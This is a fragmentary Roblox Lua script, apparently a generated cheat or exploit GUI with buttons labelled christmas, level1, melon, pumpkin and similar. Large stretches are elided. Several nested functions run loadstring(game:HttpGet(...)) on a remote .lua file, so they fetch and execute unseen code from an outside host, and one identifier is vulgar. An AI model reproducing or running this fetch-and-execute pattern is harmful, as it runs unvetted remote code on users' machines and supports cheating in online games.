...
local function RTOOWP_fake_script() -- frame.draggable 
...
coroutine.wrap(RTOOWP_fake_script)()
local function HYGFG_fake_script() -- frame.keybind 
	local script = Instance.new('LocalScript', frame)
...
coroutine.wrap(HYGFG_fake_script)()
local function AUCE_fake_script() -- frame.sdsdsdsds 
	local script = Instance.new('LocalScript', frame)

	loadstring(game:HttpGet(('https://realkosmoss.github.io/websot/scripts/cletus/slolsdfdsf.lua'),true))()local CLETUSFUCKER = Instance.new("ScreenGui")
	local frame = Instance.new("Frame")
	...
	frame.BorderSizePixel = 0
	frame.Position = UDim2.new(0.514823377, 0, 0.623941839, 0)
	frame.Size = UDim2.new(0, 406, 0, 225)
	
	main.Name = "main"
	main.Parent = frame
	main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	main.Position = UDim2.new(0, 0, -0.227272734, 0)
	...
	local function VPUJXXU_fake_script() -- christmas.LocalScript 
	...
	coroutine.wrap(VPUJXXU_fake_script)()
	local function JJYQ_fake_script() -- level1.LocalScript 
	...
	coroutine.wrap(JJYQ_fake_script)()
	local function BSGI_fake_script() -- level2.LocalScript 
	...
	coroutine.wrap(BSGI_fake_script)()
	local function AONLZ_fake_script() -- melon.LocalScript 
	...
	coroutine.wrap(AONLZ_fake_script)()
	local function PDBKFEM_fake_script() -- pineapples.LocalScript 
	...
	coroutine.wrap(PDBKFEM_fake_script)()
	local function PKAN_fake_script() -- pumpkin.LocalScript 
	...
	coroutine.wrap(PKAN_fake_script)()
	local function EUEHC_fake_script() -- frame.draggable 
		local script = Instance.new('LocalScript', frame)
	...
	coroutine.wrap(EUEHC_fake_script)()
	local function HVUVBHS_fake_script() -- frame.keybind 
		local script = Instance.new('LocalScript', frame)
	...
	coroutine.wrap(HVUVBHS_fake_script)()
	local function VUEG_fake_script() -- frame.sdsdsdsds 
		local script = Instance.new('LocalScript', frame)
	
		loadstring(game:HttpGet(('https://realkosmoss.github.io/websot/scripts/cletus/slolsdfdsf.lua'),true))()
	end
	coroutine.wrap(VUEG_fake_script)()
	
end
coroutine.wrap(AUCE_fake_script)()
local function BRWUT_fake_script() -- christmas.LocalScript 
	local script = Instance.new('LocalScript', christmas)
...
coroutine.wrap(BRWUT_fake_script)()
local function ZKVZS_fake_script() -- level1.LocalScript 
	local script = Instance.new('LocalScript', level1)
...
coroutine.wrap(ZKVZS_fake_script)()
local function VPIY_fake_script() -- level2.LocalScript 
	local script = Instance.new('LocalScript', level2)
...
coroutine.wrap(VPIY_fake_script)()
local function PDWNQ_fake_script() -- melon.LocalScript 
	local script = Instance.new('LocalScript', melon)
...
coroutine.wrap(PDWNQ_fake_script)()
local function FKFL_fake_script() -- pineapples.LocalScript 
	local script = Instance.new('LocalScript', pineapples)
...
coroutine.wrap(FKFL_fake_script)()
local function NCPOX_fake_script() -- pumpkin.LocalScript 
	local script = Instance.new('LocalScript', pumpkin)
...
coroutine.wrap(NCPOX_fake_script)()
